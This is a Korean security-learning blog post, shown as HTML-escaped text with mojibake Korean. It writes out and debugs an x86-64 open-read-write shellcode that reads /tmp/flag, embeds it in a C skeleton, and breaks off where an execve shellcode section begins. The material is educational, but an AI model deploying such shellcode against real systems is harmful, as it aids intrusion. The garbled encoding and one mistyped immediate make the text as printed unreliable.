&lt;h3 id=&quot;4-ì •ë§-ì¤‘ìš”í•œ-ì´ì•¼ê¸°-í—·ê°ˆë¦¬ì§€-ë§ì-rsp-rbpì˜-ì˜ë¯¸&quot;&gt;4. ì •ë§ ì¤‘ìš”í•œ ì´ì•¼ê¸°-í—·ê°ˆë¦¬ì§€ ë§ì! (rsp, rbpì˜ ì˜ë¯¸)&lt;/h3&gt;

&lt;p&gt;ë¬¸ë“ êµ‰ì¥íˆ ì´ìƒí•œ ì ì´ ëŠê»´ì§„ë‹¤. ì‚¬ì‹¤ ë“œë¦¼í•µ ìë£Œì— ë‚˜ì™€ ìˆëŠ” ì–´ì…ˆë¸”ë¦¬ì–´ì˜ ì›ë³¸ì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea rsi, [rsp-0x30]&lt;/code&gt; ì´ ì•„ë‹ˆë¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp -&amp;gt; sub rsi, 0x30&lt;/code&gt; ì´ë‹¤. ë‹¤ë¥¸ ë§ë¡œ ë³´ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, [rsp-0x30]&lt;/code&gt; ìœ¼ë¡œ rspì— ì €ì¥ëœ ê°’ì—ì„œ 0x30ì„ ëº€ ê°’ì„ rsiê°€ ê°€ì§„ë‹¤ëŠ” ë§ì´ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, rspì™€ rbp ë“±ì˜ ë ˆì§€ìŠ¤í„°ëŠ” ê·¸ ìì²´ê°€ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì— ìœ„ì¹˜í•œ ê²Œ ì•„ë‹ˆë¼, ê·¸ ì•ˆì— ì €ì¥ëœ ê°’ì´ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œì¸ ê²ƒì´ë‹¤. ì• ì´ˆì— CPU ë‚´ë¶€ì— ìˆëŠ” ë ˆì§€ìŠ¤í„°ê°€ ì–´ë–»ê²Œ ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œë¥¼ ê°€ì§ˆ ìˆ˜ ìˆê² ëŠëƒë§Œì€, ë‚˜ëŠ” ì´ˆë³´ìì¸ì§€ë¼ ê°œë…ì„ í—·ê°ˆë¦¬ëŠ” ë°”ëŒì— â€˜ì´ìƒí•˜ë‹¤, rspëŠ” ìŠ¤íƒì˜ ëì¼ í…ë° ì™œ rsp ë‚´ë¶€ì˜ ê°’ì—ì„œ 0x30ì„ ëº€ ê²Œ ìŠ¤íƒì˜ ëì—ì„œ 0x30 ë‚´ë ¤ì˜¨ ì£¼ì†Œì— ì ‘ê·¼í•˜ëŠ” ê²°ê³¼ê°€ ë˜ëŠ” ê±°ì§€?â€™ë¼ëŠ” ê³ ë¯¼ì— ê³¨ë¨¸ë¦¬ë¥¼ ì•“ì•˜ì—ˆë‹¤. ê²°êµ­ ë””ë²„ê±°ë¥¼ ì´ìš©í•´ ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ í™•ì¸í•˜ê³  â€˜ë§ë‹¤ ì´ê±° ë ˆì§€ìŠ¤í„°ì˜€ë‹¤â€™ë¼ëŠ” ê¹¨ë‹¬ìŒì„ ì–»ê²Œ ë˜ê¸°ê¹Œì§€ ì‹œê°„ ê½¤ë‚˜ ì¡ì•„ë¨¹ì—ˆë‹¤â€¦ ë‹¤ë¥¸ ì´ˆë³´ì ë¶„ë“¤ì€ ì´ëŸ° ì°©ê°ì„ í•˜ì‹œë”ë¼ë„ ì´ ê¸€ì„ ë³´ê³  ë¹ ë¥¸ ì •ì • í•˜ì‹œê¸¸ ë°”ë€ë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;ê³ ë“±í•™ìƒ ì‹œì ˆ ìˆ˜í•™ì„ ë…í•™í•  ë•Œê°€ ìƒê°ë‚œë‹¤. ê·¸ë•Œë„ ì´ë ‡ê²Œ ê°œë…ì´ í™•ì‹¤í•˜ê²Œ ì²´í™”ë˜ì§€ ì•Šì€ ìƒíƒœì—ì„œ ì‘ìš©í•˜ë‹¤ê°€ ê°œë… ìì²´ë¥¼ í—·ê°ˆë ¤ì„œ ë§ë‹¥ëœ¨ë¦¬ëŠ” ë¬¸ì œì— ë§ì´ ë§ë‹¥ëœ¨ë ¸ì—ˆë‹¤. ì‹œê°„ì´ íë¥¸ ë’¤ ë‹¤ì‹œ í•´ë‹¹ ë¬¸ì œë¥¼ ëŒì•„ë³´ë‹ˆ ë‚´ê°€ ì™œ ê·¸ê±¸ ë¬¸ì œì ìœ¼ë¡œ ìƒê°í–ˆëŠ”ì§€ ìì²´ë¥¼ í™©ë‹¹í•´í•˜ê²Œ ë˜ë”ë¼. ì•„ë§ˆë„ ë‚˜ì¤‘ì— ë‚´ê°€ ì´ê±¸ ì½ì–´ë³´ë©´ ë˜‘ê°™ì€ ê¸°ë¶„ì„ ëŠë¼ì§€ ì•Šì„ê¹Œ. í‘¸í•˜í•˜í•˜&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;5-ì¢…í•©&quot;&gt;5. ì¢…í•©&lt;/h3&gt;

&lt;p&gt;ì´ì œê¹Œì§€ ì“´ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ëª¨ë‘ ì¢…í•©í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;; open()
mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f ; ë“œë¦¼í•µ ìë£Œì—ì„œëŠ” ë¨¼ì € ìŠ¤íƒì— 0x67ì„ ë„£ê³  ë’¤ì˜ ë°ì´í„°ë¥¼ raxì— ë„£ì€ í›„ raxì˜ ë°ì´í„°ë¥¼ ìŠ¤íƒì— ë„£ì–´ì£¼ëŠ”ë°, ì™œ ê·¸ë ‡ê²Œ í–ˆì§€? ì´ìœ  ì•„ëŠ” ë¶„ì€ ì•Œë ¤ì£¼ì„¸ìš”.
; ê¸€ë¡œë²Œ ë³´ì•ˆìº í”„ì—ì„œ ë§Œë‚¬ë˜ ì¹œêµ¬ê°€ ê°€ë” ì–´ì…ˆë¸”ë¦¬ì–´ ì½”ë“œëŠ” ë¹„íš¨ìœ¨ì ì¸ í–‰ë™ì„ í•œëŒ”ëŠ”ë°, ê·¸ê²ƒ ë•Œë¬¸ì¸ê°€...
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall

; read()
mov rdi, rax
lea rsi, [rsp-0x30] ; == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : ì´ê²Œ ê°€ëŠ¥í•œ ì´ìœ ëŠ” rspì™€ rbpê°€ ìŠ¤íƒì˜ ëê³¼ ì‹œì‘ì„ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ì´ê¸° ë•Œë¬¸ì´ë‹¤. 
; ì¦‰, ë ˆì§€ìŠ¤í„° ë‚´ë¶€ì— ìˆëŠ” ê°’ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œê°€ ë°”ë¡œ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì´ë‹¤. ë ˆì§€ìŠ¤í„°ì— ìˆëŠ” ê°’ì„ ë³€ê²½í•˜ë©´ ë°”ë¡œ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì„ ê¸°ì¤€ìœ¼ë¡œ ì´ë™í•œ ìœ„ì¹˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.
mov rdx, 0x30
mov rax, 0x00
syscall

; write()
mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;orw-ì…¸ì½”ë“œ-ì»´íŒŒì¼-ë°-ì‹¤í–‰&quot;&gt;orw ì…¸ì½”ë“œ ì»´íŒŒì¼ ë° ì‹¤í–‰&lt;/h2&gt;

&lt;p&gt;ì…¸ì½”ë“œëŠ” ê·¸ëƒ¥ ê¸°ê³„ì–´ë¡œ ë²ˆì—­í•˜ë©´ CPUê°€ ì´í•´í•  ìˆ˜ëŠ” ìˆì§€ë§Œ ì‹¤í–‰ íŒŒì¼ì˜ í˜•ì‹ì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ì‹œìŠ¤í…œì´ ì´ê²ƒì„ ì‹¤í–‰í•´ì•¼ í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ëª°ë¼ì„œ ì‹¤í–‰í•˜ì§€ ì•Šê²Œ ëœë‹¤. ë”°ë¼ì„œ gcc ì»´íŒŒì¼ëŸ¬ë¥¼ í†µí•´ ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ ì €ì¥í•œ ì†ŒìŠ¤ íŒŒì¼ì¸ orw.S íŒŒì¼ì„ ELF íŒŒì¼ í˜•ì‹ìœ¼ë¡œ ë³€í˜•í•´ ì¤˜ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ëŠ” ë°©ë²•ì—ëŠ” ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆì§€ë§Œ, ì´ë²ˆ ì½”ìŠ¤ì—ì„œ ë°°ìš´ ê²ƒì€ c ì–¸ì–´ë¡œ ìŠ¤ì¼ˆë ˆí†¤ ì½”ë“œë¥¼ ì‘ì„±í•œ í›„ ê·¸ ìœ„ì— ì…¸ì½”ë“œë¥¼ ì–¹ì–´ì„œ ì‹¤í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ì—ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ìŠ¤ì¼ˆë ˆí†¤ ì½”ë“œ: í•µì‹¬ ë‚´ìš©ì´ ë¹„ì–´ìˆëŠ”, ê¸°ë³¸ êµ¬ì¡°ë§Œ ê°–ì¶˜ ì½”ë“œ. ê·¸ ì•ˆì— í•µì‹¬ ë‚´ìš©ìœ¼ë¡œ ì…¸ì½”ë“œë¥¼ ì§‘ì–´ë„£ì–´ ì»´íŒŒì¼í•¨ìœ¼ë¡œì¨ ì…¸ì½”ë“œë¥¼ ì»´íŒŒì¼í•  ìˆ˜ ìˆë‹¤&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x67616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cì–¸ì–´ì—ì„œ ì–´ì…ˆë¸”ë¦¬ì–´ ëª…ë ¹ì„ ë¼ì›Œë„£ìœ¼ë ¤ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm__(&quot;one line&quot;)&lt;/code&gt; ìœ¼ë¡œ ìˆ˜í–‰í•˜ê±°ë‚˜, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm{multi line}&lt;/code&gt; ìœ¼ë¡œ ìˆ˜í–‰í•˜ë©´ ë˜ëŠ”ë°, XCode(ë§¥ë¶ì˜ ê·¸ê²ƒ ë§ë‹¤)ì— ìˆëŠ” gccê°€ ì•„ë‹ˆë¼ë©´ VCì—ì„œ í•˜ëŠ” ê²ƒì²˜ëŸ¼ ì–´ì…ˆë¸”ëŸ­ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë¨¹íˆì§€ ì•ŠëŠ”ë‹¤.(ìµœê·¼ì— ì—…ë°ì´íŠ¸ ëë‹¤ë©´ ë‚´ê°€ í‹€ë ¸ì„ ê²ƒì´ë‹¤) ê·¸ë˜ì„œ í•œ ì¤„ì”© ì‘ì„±í•´ì•¼ í•˜ëŠ” ì „ìì˜ ë°©ì‹ì„ ì±„íƒí•œ ê²ƒìœ¼ë¡œ ì¶”ì¸¡í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;ê·¸ëŸ¬ë‚˜ ê¶ê¸ˆí•œ ì . main í•¨ìˆ˜ ì•ˆì— ë„£ì–´ë„ ë˜ëŠ”ë° ì™œ ì €ë ‡ê²Œ ë¶„ë¦¬í–ˆëŠ”ì§€ ëª¨ë¥´ê² ê³ , run_sh() í•¨ìˆ˜ëŠ” ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ í¬í•¨í•˜ëŠ” ê²ƒì´ ì•„ë‹Œ ê±¸ë¡œ ë³´ì´ëŠ”ë° ì™œ run_shë¥¼ ë§Œë“¤ì–´ ë„£ì€ ê²ƒì¸ì§€ ì˜ë¬¸ì´ë‹¤. ëˆ„ê°€ ì¢€ ì•Œë ¤ì£¼ë¼â€¦.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;ì•„ë¬´íŠ¼, ì´ë ‡ê²Œ ì“°ê³  ì»´íŒŒì¼ì„ ëŒë ¸ëŠ”ë°â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%201.jpeg&quot; alt=&quot;ì–´ë¼? ì´ìƒí•œ ì˜¤ë¥˜ê°€ ìƒê²¼ë‹¤.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì–´ë¼? ì´ìƒí•œ ì˜¤ë¥˜ê°€ ìƒê²¼ë‹¤.&lt;/p&gt;

&lt;p&gt;â€˜missing or invalid immediate expressionâ€™. immediate í˜•ì˜ ë°ì´í„°ê°€ ì˜¬ë°”ë¥´ì§€ ì•Šì€ ê·œê²©ì´ë¼ëŠ” ëœ» ê°™ì•˜ë‹¤. ëŒ€ì²´ ì™œ ì´ëŸ° ì˜¤ë¥˜ê°€ ëœ¨ì§€? ê¶ê¸ˆí•´ì„œ ì°¾ì•„ë´¤ë‹¤.&lt;/p&gt;

&lt;p&gt;ë¨¼ì € ì–´ì…ˆë¸”ë¦¬ì–´ì—ì„œ immediateê°€ ë“¤ì–´ê°€ëŠ” ìš©ì–´ëŠ” ë‘ ê°€ì§€ê°€ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;immediate expression: ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— valueê°€ í•˜ë“œì½”ë”©ë˜ì–´ ìˆì„ ë•Œ ì´ë¥¼ ì¹­í•˜ëŠ” ìš©ì–´&lt;/li&gt;
  &lt;li&gt;immediate addressing: ì¸ìŠ¤íŠ¸ëŸ­ì…˜(opcode + operand)ì˜ operandì— immediate dataê°€ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ, ì£¼ì†Œë¥¼ ì§ì„¤ì ìœ¼ë¡œ ì§€ì •í•´ ì£¼ëŠ” ê²ƒ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ë‹¤ë§Œ, ì´ë ‡ê²Œ immediateê°€ ë¶™ëŠ” ë°©ì‹ì—ëŠ” ë¬´ì¡°ê±´ ì œí•œì´ ìˆì—ˆë‹¤. ë°”ë¡œ â€˜ë°ì´í„° í¬ê¸°ê°€ address ì˜ì—­ ì‚¬ì´ì¦ˆë§Œí¼ ì œí•œëœë‹¤â€™ ëŠ” ì ì´ì—ˆë‹¤. ì• ì´ˆì— operandê°€ opcode ì‹¤í–‰ ì‹œ ì‚¬ìš©í•  ë°ì´í„°ì˜ ì£¼ì†Œë¥¼ ë‚˜íƒ€ë‚´ê¸° ìœ„í•œ ì˜ì—­ì´ê¸° ë•Œë¬¸ì´ë‹¤. ë˜í•œ immediateì˜ ê¸¸ì´ëŠ” instructionì˜ ê¸¸ì´ ì œí•œì´ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´ ê·¸ê²ƒì—ë„ ì˜í–¥ì„ ë°›ëŠ”ë‹¤.&lt;/p&gt;

&lt;p&gt;í˜„ì¬ ë‚´ê°€ ì‚¬ìš©í•˜ê³  ìˆëŠ” í™˜ê²½ì€ ë¦¬ëˆ…ìŠ¤ x86-64 64bitì´ê³ , ë©”ëª¨ë¦¬ address í‘œí˜„ ë°©ì‹ì€ 64bitë¡œ í‘œí˜„ëœë‹¤. ì „ìì˜ 64bitëŠ” word ìˆ˜ì´ê³  í›„ìëŠ” ë©”ëª¨ë¦¬ ì£¼ì†Œì˜ ê¸¸ì´ì´ë¯€ë¡œ í—·ê°ˆë¦¬ë©´ ì•ˆ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰ ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ 64bitì´ê¸° ë•Œë¬¸ì— ë‚´ê°€ ì§‘ì–´ë„£ì„ ìˆ˜ ìˆëŠ” immediate dataì˜ ê¸¸ì´ í•œê³„ëŠ” 64bitì¼ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov r8, 0x67616c662f705d742f\n&lt;/code&gt; ë¥¼ ë‚´ í™˜ê²½ì´ ì†Œí™”í•  ìˆ˜ ìˆëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ë°”ê¾¸ì–´ ì£¼ë©´,&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë ‡ê²Œ ê³ ì³ì„œ ì»´íŒŒì¼ì„ ì‹œë„í•˜ë‹ˆ ì•„ë¬´ ì˜¤ë¥˜ ì—†ì´ ì„±ê³µí•  ìˆ˜ ìˆì—ˆë‹¤!&lt;/p&gt;

&lt;p&gt;ì´ì œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/flag&lt;/code&gt; íŒŒì¼ì„ ë§Œë“¤ì–´ ê·¸ ì•ˆì— ì›í•˜ëŠ” ë‚´ìš©ì„(48 ë°”ì´íŠ¸ ì´ë‚´) ì¨ë‘” í›„, ì»´íŒŒì¼í•œ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´ í•´ë‹¹ ë‚´ìš©ì´ ì½˜ì†”ì— ì¶œë ¥ë˜ê²Œë” í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%202.jpeg&quot; alt=&quot;ì‹¤ì œë¡œ ì‹¤í–‰í•œ ê²°ê³¼.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‹¤ì œë¡œ ì‹¤í–‰í•œ ê²°ê³¼.&lt;/p&gt;

&lt;p&gt;gdbì— orwë¥¼ ë¬¼ë ¤ì„œ ì‹¤í–‰ ê³¼ì •ì„ ì‚´í´ë´¤ëŠ”ë°, ë‚´ê°€ ì…ë ¥í•˜ê³  ì‹¶ì€ ìŠ¤íŠ¸ë§ì´ ì­ˆë£¨ë£© ë“¤ì–´ê°€ê³  ì˜ë„í–ˆë˜ ì‹œìŠ¤ì½œì´ ì•Œë§ì€ ì¸ìë¥¼ ê°€ì§€ê³  ì œëŒ€ë¡œ ëŒì•„ê°€ëŠ” ê±¸ ëˆˆìœ¼ë¡œ ì§ì ‘ í™•ì¸í•˜ë‹ˆ ë„ˆë¬´ ì‹ ê¸°í•˜ê³  ì¬ë¯¸ìˆì—ˆë‹¤. íˆíˆ&lt;/p&gt;

&lt;p&gt;ê·¸ëŸ°ë° ì´ìƒí•œ ì . í”Œë˜ê·¸ì˜ ê¸€ì ìˆ˜ë¥¼ ì„¸ì–´ ë³´ë©´ 29ê¸€ìë¡œ ì›ë˜ ì˜ë„í–ˆë˜ 48ë°”ì´íŠ¸ë³´ë‹¤ í•œì°¸ ì‘ì€ í¬ê¸°ì˜ ë¬¸ìì—´ì„ ì½ì–´ì™”ìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì´ëŸ¬ë©´ 29ë°”ì´íŠ¸ + 19ë°”ì´íŠ¸ ì¯¤ìœ¼ë¡œ ë’¤ì— ì“°ë ˆê¸°ê°’ì´ ë¶™ì–´ ë‚˜ì™€ì•¼ í•˜ëŠ”ë°(ë“œë¦¼í•µ ìë£Œì—ì„œë„ ë™ì¼í•œ ì´ì•¼ê¸°ë¥¼ í•˜ê³  ìˆë‹¤)â€¦. ë‚˜ëŠ” ì™œ ì•ˆ ë‚˜ì˜¤ì§€? ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ ì´ìƒí•œë°â€¦&lt;/p&gt;

&lt;aside&gt;
âš™ Uninitialized Memory &lt;br /&gt;
  
ìŠ¤íƒì€ ê° í•¨ìˆ˜ë³„ë¡œ ìŠ¤íƒ í”„ë ˆì„ì´ë¼ëŠ” ì œë„ë¥¼ ë§Œë“¤ì–´ ê³µê°„ì„ ë¶„ë¦¬í•´ ì‚¬ìš©í•˜ëŠ”, ì¼ì¢…ì˜ í•¨ìˆ˜ê°„ ê³µìœ  ìì›ìœ¼ë¡œ ì •ì˜ë  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë‚˜ ì–´ë–¤ í•¨ìˆ˜ë¥¼ ìˆ˜í–‰í•˜ê³  ë‹¤ì‹œ ì›ë˜ì˜ í•¨ìˆ˜ë¡œ ëŒì•„ì˜¬ ë•Œ, ì§ì „ì˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ ì˜ì—­ì„ 0ìœ¼ë¡œ ì´ˆê¸°í™”í•˜ëŠ” ê²Œ ì•„ë‹ˆë¼(Uninitialized Memory) ê·¸ëƒ¥ rbpì™€ rspì˜ ìœ„ì¹˜ë§Œ ì˜®ê²¨ ì˜¤ëŠ” ì›ë¦¬ë¡œ ìŠ¤íƒì„ ê´€ë¦¬í•˜ê¸° ë•Œë¬¸ì— ì´ì „ ìŠ¤íƒ í”„ë ˆì„ì˜ ë°ì´í„°ëŠ” ê³ ìŠ¤ë€íˆ ë‚¨ì•„ ìˆê²Œ ëœë‹¤. ì´ê²ƒì´ ë°”ë¡œ ì“°ë ˆê¸° ê°’(garbage data)ì´ë‹¤.

ì´ëŸ° ì“°ë ˆê¸° ê°’ì— ì˜ ì ‘ê·¼í•˜ë©´ í”„ë¡œì„¸ìŠ¤ê°€ í”„ë¡œê·¸ë˜ë¨¸ì˜ ì˜ë„ì™€ëŠ” ë‹¤ë¥¸ ë™ì‘ì„ í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ë„ ìˆê³ , ì¤‘ìš”í•œ ì •ë³´ë¥¼ ì½ì–´ë‚¼(Memory Leak) ìˆ˜ë„ ìˆë‹¤. ì´ëŸ° ê±¸ ë§‰ê¸° ìœ„í•´ ì‹œíì–´ ì½”ë”©ì´ë¼ëŠ” ê²ƒì„ í•˜ëŠ”ë°, ê·¸ê±´ KISA ë“¤ì–´ê°€ì„œ ì°¾ì•„ë³´ë©´ ì§€ì¹¨ì„œê°€ ë‚˜ì˜¤ë‹ˆ ê´€ì‹¬ ìˆëŠ” ì‚¬ëŒë“¤ì€ ê·¸ìª½ì„ ì°¸ê³ í•˜ì‹œê¸¸!

&lt;/aside&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;execve-ì…¸ì½”ë“œ&quot;&gt;execve ì…¸ì½”ë“œ&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ì¼ë°˜ì ìœ¼ë¡œ ì…¸ì½”ë“œë¼ê³  ë¶€ë¥´ëŠ” ê²ƒì€ ëª¨ë‘ ì´ ì…¸ì½”ë“œ&lt;/li&gt;
